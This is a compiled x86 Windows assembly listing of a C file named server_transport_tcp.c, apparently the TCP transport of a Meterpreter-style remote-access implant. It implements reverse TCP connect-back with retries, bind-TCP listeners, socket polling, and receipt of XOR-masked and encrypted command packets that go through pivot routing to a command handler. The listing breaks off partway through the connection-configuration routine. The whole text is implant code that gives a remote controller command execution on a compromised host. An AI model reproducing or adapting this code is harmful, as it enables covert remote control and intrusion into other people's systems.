	.file	"server_transport_tcp.c"
	.text
	.def	_reverse_tcp_run;	.scl	3;	.type	32;	.endef
_reverse_tcp_run:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	call	_current_unix_timestamp
	movl	%eax, -16(%ebp)
L4:
	call	_current_unix_timestamp
	movl	%eax, -20(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__connect@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -12(%ebp)
	cmpl	$-1, -12(%ebp)
	jne	L7
	movl	24(%ebp), %eax
	movl	%eax, (%esp)
	call	_sleep
	call	_current_unix_timestamp
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	cmpl	%eax, 20(%ebp)
	ja	L4
	jmp	L3
L7:
	nop
L3:
	cmpl	$-1, -12(%ebp)
	jne	L5
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
L5:
	movl	-12(%ebp), %eax
	leave
	ret
	.def	_reverse_tcp4;	.scl	3;	.type	32;	.endef
_reverse_tcp4:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	subl	$484, %esp
	movl	12(%ebp), %eax
	movw	%ax, -444(%ebp)
	movl	24(%ebp), %eax
	movl	$0, (%eax)
	leal	-424(%ebp), %edx
	movl	$0, %eax
	movl	$100, %ecx
	movl	%edx, %edi
	rep stosl
	leal	-424(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$514, (%esp)
	movl	__imp__WSAStartup@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L9
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L12
L9:
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$2, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -12(%ebp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__gethostbyname@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	12(%eax), %eax
	movl	(%eax), %eax
	movl	(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__inet_ntoa@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -20(%ebp)
	movl	$0, -440(%ebp)
	movl	$0, -436(%ebp)
	movl	$0, -432(%ebp)
	movl	$0, -428(%ebp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__inet_addr@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -436(%ebp)
	movw	$2, -440(%ebp)
	movzwl	-444(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movw	%ax, -438(%ebp)
	movl	20(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$16, 8(%esp)
	leal	-440(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_reverse_tcp_run
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	jne	L11
	movl	24(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, (%eax)
L11:
	movl	-24(%ebp), %eax
L12:
	movl	-4(%ebp), %edi
	leave
	ret
	.def	_reverse_tcp6;	.scl	3;	.type	32;	.endef
_reverse_tcp6:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	subl	$484, %esp
	movl	28(%ebp), %eax
	movl	$0, (%eax)
	leal	-428(%ebp), %edx
	movl	$0, %eax
	movl	$100, %ecx
	movl	%edx, %edi
	rep stosl
	leal	-428(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$514, (%esp)
	movl	__imp__WSAStartup@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L14
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L24
L14:
	movl	$0, %ecx
	movl	$32, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L16:
	movl	%ecx, -460(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L16
	movl	$23, -456(%ebp)
	movl	$1, -452(%ebp)
	movl	$6, -448(%ebp)
	leal	-464(%ebp), %eax
	movl	%eax, 12(%esp)
	leal	-460(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__getaddrinfo@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	je	L18
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L24
L18:
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$23, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -20(%ebp)
	cmpl	$-1, -20(%ebp)
	jne	L19
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L24
L19:
	movl	$0, -12(%ebp)
	call	_current_unix_timestamp
	movl	%eax, -24(%ebp)
L23:
	call	_current_unix_timestamp
	movl	%eax, -28(%ebp)
	movl	-464(%ebp), %eax
	movl	%eax, -16(%ebp)
	jmp	L20
L22:
	movl	-16(%ebp), %eax
	movl	24(%eax), %eax
	movl	16(%ebp), %edx
	movl	%edx, 24(%eax)
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	24(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__connect@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -12(%ebp)
	cmpl	$-1, -12(%ebp)
	je	L21
	movl	28(%ebp), %eax
	movl	-20(%ebp), %edx
	movl	%edx, (%eax)
	movl	-464(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__freeaddrinfo@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, %eax
	jmp	L24
L21:
	movl	-16(%ebp), %eax
	movl	28(%eax), %eax
	movl	%eax, -16(%ebp)
L20:
	cmpl	$0, -16(%ebp)
	jne	L22
	movl	24(%ebp), %eax
	movl	%eax, (%esp)
	call	_sleep
	call	_current_unix_timestamp
	movl	%eax, %edx
	movl	-24(%ebp), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	cmpl	%eax, 20(%ebp)
	ja	L23
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-464(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__freeaddrinfo@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
L24:
	movl	-4(%ebp), %edi
	leave
	ret
	.def	_bind_tcp_run;	.scl	3;	.type	32;	.endef
_bind_tcp_run:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__bind@12, %eax
	call	*%eax
	subl	$12, %esp
	cmpl	$-1, %eax
	jne	L26
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L27
L26:
	movl	$1, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__listen@8, %eax
	call	*%eax
	subl	$8, %esp
	cmpl	$-1, %eax
	jne	L28
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L27
L28:
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__accept@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -16(%ebp)
	cmpl	$-1, -16(%ebp)
	jne	L29
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L27
L29:
	movl	20(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, (%eax)
L27:
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
	leave
	ret
	.def	_bind_tcp;	.scl	3;	.type	32;	.endef
_bind_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	subl	$500, %esp
	movl	8(%ebp), %eax
	movw	%ax, -460(%ebp)
	movl	12(%ebp), %eax
	movl	$0, (%eax)
	leal	-420(%ebp), %edx
	movl	$0, %eax
	movl	$100, %ecx
	movl	%edx, %edi
	rep stosl
	leal	-420(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$514, (%esp)
	movl	__imp__WSAStartup@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L32
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	jmp	L44
L32:
	movl	$0, -12(%ebp)
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$23, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -16(%ebp)
	cmpl	$-1, -16(%ebp)
	jne	L34
	movl	$1, -12(%ebp)
	jmp	L35
L34:
	movl	$0, -452(%ebp)
	movl	$4, 16(%esp)
	leal	-452(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$27, 8(%esp)
	movl	$41, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__setsockopt@20, %eax
	call	*%eax
	subl	$20, %esp
	cmpl	$-1, %eax
	jne	L35
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$1, -12(%ebp)
L35:
	cmpl	$0, -12(%ebp)
	je	L37
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$2, (%esp)
	movl	__imp__socket@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -16(%ebp)
L37:
	movl	$0, %ecx
	movl	$28, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L38:
	movl	%ecx, -448(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L38
	cmpl	$0, -12(%ebp)
	je	L40
	leal	-448(%ebp), %eax
	movl	%eax, -20(%ebp)
	movl	$0, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movzwl	%ax, %edx
	movl	-20(%ebp), %eax
	movl	%edx, 4(%eax)
	movl	-20(%ebp), %eax
	movw	$2, (%eax)
	movzwl	-460(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-20(%ebp), %edx
	movw	%ax, 2(%edx)
	jmp	L41
L40:
	movl	_in6addr_any, %eax
	movl	%eax, -440(%ebp)
	movl	_in6addr_any+4, %eax
	movl	%eax, -436(%ebp)
	movl	_in6addr_any+8, %eax
	movl	%eax, -432(%ebp)
	movl	_in6addr_any+12, %eax
	movl	%eax, -428(%ebp)
	movw	$23, -448(%ebp)
	movzwl	-460(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movw	%ax, -446(%ebp)
L41:
	cmpl	$0, -12(%ebp)
	je	L42
	movl	$16, %edx
	jmp	L43
L42:
	movl	$28, %edx
L43:
	movl	12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	%edx, 8(%esp)
	leal	-448(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_bind_tcp_run
L44:
	movl	-4(%ebp), %edi
	leave
	ret
	.def	_server_socket_poll;	.scl	3;	.type	32;	.endef
_server_socket_poll:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$328, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	$0, -288(%ebp)
	movl	$0, -12(%ebp)
	jmp	L46
L49:
	movl	-12(%ebp), %eax
	movl	-284(%ebp,%eax,4), %edx
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	cmpl	%eax, %edx
	je	L52
	addl	$1, -12(%ebp)
L46:
	movl	-288(%ebp), %eax
	cmpl	%eax, -12(%ebp)
	jb	L49
	jmp	L48
L52:
	nop
L48:
	movl	-288(%ebp), %eax
	cmpl	%eax, -12(%ebp)
	jne	L50
	movl	-288(%ebp), %eax
	cmpl	$63, %eax
	ja	L50
	movl	-16(%ebp), %eax
	movl	(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, -284(%ebp,%eax,4)
	movl	-288(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -288(%ebp)
L50:
	movl	$0, -28(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, -24(%ebp)
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	leal	1(%eax), %edx
	leal	-28(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	leal	-288(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	movl	__imp__select@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -20(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	-20(%ebp), %eax
	leave
	ret
	.def	_packet_receive;	.scl	3;	.type	32;	.endef
_packet_receive:
	pushl	%ebp
	movl	%esp, %ebp
	movl	$65656, %eax
	call	___chkstk_ms
	subl	%eax, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, %ecx
	movl	$32, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L54:
	movl	%ecx, -100(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L54
	movl	$1, -20(%ebp)
	movl	$0, -24(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -36(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	jmp	L56
L60:
	movl	$32, %eax
	subl	-12(%ebp), %eax
	movl	%eax, %ecx
	leal	-100(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%eax, %edx
	movl	-36(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -56(%ebp)
	cmpl	$0, -56(%ebp)
	jg	L57
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L58
L57:
	movl	-56(%ebp), %eax
	addl	%eax, -12(%ebp)
	cmpl	$32, -12(%ebp)
	je	L59
	jmp	L56
L59:
	movl	$0, -20(%ebp)
L56:
	cmpl	$0, -20(%ebp)
	jne	L60
	cmpl	$32, -12(%ebp)
	jne	L83
	movzbl	-97(%ebp), %eax
	testb	%al, %al
	jne	L62
	leal	-100(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -60(%ebp)
	movl	-60(%ebp), %eax
	subl	$28, %eax
	movl	%eax, -28(%ebp)
	jmp	L63
L67:
	movl	-28(%ebp), %eax
	movl	$65535, %edx
	cmpl	$65535, %eax
	cmova	%edx, %eax
	movl	%eax, %edx
	movl	-36(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	leal	-65636(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -64(%ebp)
	cmpl	$0, -64(%ebp)
	jns	L64
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	cmpl	$10035, %eax
	jne	L65
	jmp	L63
L65:
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L66
L64:
	movl	-64(%ebp), %eax
	subl	%eax, -28(%ebp)
L63:
	cmpl	$0, -28(%ebp)
	jg	L67
L66:
	cmpl	$0, -28(%ebp)
	jg	L84
	movl	$0, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	12(%ebp), %eax
	movl	$0, (%eax)
	jmp	L58
L62:
	movl	-100(%ebp), %eax
	movl	%eax, -65636(%ebp)
	movl	-96(%ebp), %eax
	movl	%eax, -65632(%ebp)
	movl	-92(%ebp), %eax
	movl	%eax, -65628(%ebp)
	movl	-88(%ebp), %eax
	movl	%eax, -65624(%ebp)
	movl	-84(%ebp), %eax
	movl	%eax, -65620(%ebp)
	movl	-80(%ebp), %eax
	movl	%eax, -65616(%ebp)
	movl	-76(%ebp), %eax
	movl	%eax, -65612(%ebp)
	movl	-72(%ebp), %eax
	movl	%eax, -65608(%ebp)
	leal	-100(%ebp), %eax
	addl	$4, %eax
	movl	$28, 8(%esp)
	movl	%eax, 4(%esp)
	leal	-100(%ebp), %eax
	movl	%eax, (%esp)
	call	_xor_bytes
	movl	-76(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__ntohl@4, %eax
	call	*%eax
	subl	$4, %esp
	subl	$8, %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	addl	$32, %eax
	movl	%eax, -44(%ebp)
	movl	-40(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	jne	L69
	movl	$8, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L58
L69:
	movl	$32, 12(%esp)
	leal	-65636(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$32, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__memcpy_s, %eax
	call	*%eax
	movl	-24(%ebp), %eax
	addl	$32, %eax
	movl	%eax, -48(%ebp)
	jmp	L71
L75:
	movl	-16(%ebp), %edx
	movl	-40(%ebp), %eax
	subl	-16(%ebp), %eax
	movl	%eax, %ecx
	movl	-48(%ebp), %eax
	addl	%eax, %ecx
	movl	-36(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -56(%ebp)
	cmpl	$0, -56(%ebp)
	jg	L72
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	cmpl	$10035, %eax
	jne	L73
	jmp	L71
L73:
	cmpl	$0, -56(%ebp)
	jns	L85
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L85
L72:
	movl	-56(%ebp), %eax
	subl	%eax, -16(%ebp)
L71:
	cmpl	$0, -16(%ebp)
	jne	L75
	cmpl	$0, -16(%ebp)
	jne	L86
	leal	-100(%ebp), %eax
	addl	$4, %eax
	movl	%eax, (%esp)
	call	_is_null_guid
	testl	%eax, %eax
	jne	L77
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	addl	$32, %eax
	movl	$16, 8(%esp)
	leal	-100(%ebp), %edx
	addl	$4, %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_memcmp
	testl	%eax, %eax
	jne	L78
L77:
	movl	-44(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_decrypt_packet
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L58
L78:
	movl	8(%ebp), %eax
	movl	80(%eax), %eax
	leal	-100(%ebp), %edx
	addl	$4, %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_find
	movl	%eax, -52(%ebp)
	cmpl	$0, -52(%ebp)
	je	L58
	movl	-44(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, (%esp)
	call	_pivot_packet_dispatch
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, -24(%ebp)
	movl	12(%ebp), %eax
	movl	$0, (%eax)
	jmp	L58
L83:
	nop
	jmp	L58
L84:
	nop
	jmp	L58
L85:
	nop
	jmp	L58
L86:
	nop
L58:
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -68(%ebp)
	cmpl	$0, -24(%ebp)
	je	L80
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -24(%ebp)
L80:
	cmpl	$0, -68(%ebp)
	je	L81
	cmpl	$0, -32(%ebp)
	je	L81
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -32(%ebp)
L81:
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	-68(%ebp), %eax
	leave
	ret
	.def	_server_dispatch_tcp;	.scl	3;	.type	32;	.endef
_server_dispatch_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -24(%ebp)
	movl	$1, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -28(%ebp)
	call	_current_unix_timestamp
	movl	%eax, -20(%ebp)
	jmp	L88
L96:
	movl	12(%ebp), %eax
	movl	8(%eax), %eax
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	_event_poll
	testl	%eax, %eax
	jne	L98
	movl	$50000, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_server_socket_poll
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jle	L91
	leal	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_receive
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L99
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	je	L93
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_command_handle
	movl	%eax, -12(%ebp)
L93:
	call	_current_unix_timestamp
	movl	%eax, -20(%ebp)
	jmp	L88
L91:
	cmpl	$0, -16(%ebp)
	jne	L100
	call	_current_unix_timestamp
	movl	%eax, -32(%ebp)
	movl	8(%ebp), %eax
	movl	72(%eax), %eax
	cmpl	%eax, -32(%ebp)
	jle	L95
	movl	$0, -16(%ebp)
	jmp	L90
L95:
	movl	-32(%ebp), %eax
	subl	-20(%ebp), %eax
	movl	%eax, %edx
	movl	-24(%ebp), %eax
	movl	52(%eax), %eax
	cmpl	%eax, %edx
	jle	L88
	movl	$5035, -16(%ebp)
	jmp	L90
L88:
	cmpl	$0, -12(%ebp)
	jne	L96
	jmp	L90
L98:
	nop
	jmp	L90
L99:
	nop
	jmp	L90
L100:
	nop
L90:
	movl	-16(%ebp), %eax
	leave
	ret
	.def	_transport_get_handle_tcp;	.scl	3;	.type	32;	.endef
_transport_get_handle_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	cmpl	$0, 8(%ebp)
	je	L102
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L102
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	(%eax), %eax
	jmp	L103
L102:
	movl	$0, %eax
L103:
	popl	%ebp
	ret
	.def	_transport_set_handle_tcp;	.scl	3;	.type	32;	.endef
_transport_set_handle_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	cmpl	$0, 8(%ebp)
	je	L106
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L106
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%eax)
L106:
	nop
	popl	%ebp
	ret
	.def	_transport_destroy_tcp;	.scl	3;	.type	32;	.endef
_transport_destroy_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	cmpl	$0, 8(%ebp)
	je	L111
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L111
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L109
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	8(%ebp), %eax
	movl	$0, 44(%eax)
L109:
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	testl	%eax, %eax
	je	L110
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	8(%ebp), %eax
	movl	$0, 48(%eax)
L110:
	cmpl	$0, 8(%ebp)
	je	L111
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, 8(%ebp)
L111:
	nop
	leave
	ret
	.globl	_cleanup_socket@4
	.def	_cleanup_socket@4;	.scl	2;	.type	32;	.endef
_cleanup_socket@4:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -12(%ebp)
	jmp	L113
L115:
	cmpl	$0, -16(%ebp)
	jle	L117
L113:
	movl	$0, 12(%esp)
	movl	$4, 8(%esp)
	leal	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L115
	jmp	L114
L117:
	nop
L114:
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_thread_destroy
	movl	$0, %eax
	leave
	ret	$4
	.def	_transport_reset_tcp;	.scl	3;	.type	32;	.endef
_transport_reset_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	cmpl	$0, 8(%ebp)
	je	L122
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L122
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L120
	cmpl	$0, 12(%ebp)
	je	L121
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L120
L121:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$_cleanup_socket@4, (%esp)
	call	_thread_create
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_thread_run
L120:
	movl	-12(%ebp), %eax
	movl	$0, (%eax)
L122:
	nop
	leave
	ret
	.section .rdata,"dr"
LC0:
	.ascii "tcp\0"
LC1:
	.ascii "//\0"
	.text
	.def	_configure_tcp_connection;	.scl	3;	.type	32;	.endef
_configure_tcp_connection:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$588, %esp
	movl	$0, -28(%ebp)
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L124
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	$511, 16(%esp)
	movl	%eax, 12(%esp)
	movl	$512, 8(%esp)
	leal	-564(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-52(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__wcstombs_s, %eax
	call	*%eax
	call	_current_unix_timestamp
	movl	8(%ebp), %edx
	movl	%eax, 64(%edx)
	movl	$3, 8(%esp)
	movl	$LC0, 4(%esp)
	leal	-564(%ebp), %eax
	movl	%eax, (%esp)
	call	_strncmp
	testl	%eax, %eax
	jne	L124
	movl	$LC1, 4(%esp)
	leal	-564(%ebp), %eax
	movl	%eax, (%esp)
	call	_strstr
	addl	$2, %eax
	movl	%eax, -36(%ebp)
	movl	$58, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_strrchr
	addl	$1, %eax
